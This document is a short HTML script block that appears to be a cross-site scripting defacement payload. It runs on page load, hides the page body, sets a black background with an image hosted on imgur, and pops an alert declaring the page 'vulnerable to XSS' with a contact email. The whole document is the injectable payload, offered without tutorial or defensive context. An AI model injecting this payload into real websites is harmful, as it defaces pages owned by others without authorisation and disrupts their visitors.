<script>
function XSS() {
    document.body.style.display = "none";
    document.body.style.backgroundColor = "#000";
    document.body.style.backgroundImage = "url('https://i.imgur.com/Kbad6dr.gif')";
    document.body.style.backgroundRepeat = "no-repeat";
    document.body.style.backgroundSize = "cover";
    alert('This page is vulnerable to XSS! Email - AntiGuyXSS@gmail.com');
}
window.onload=XSS;
</script> 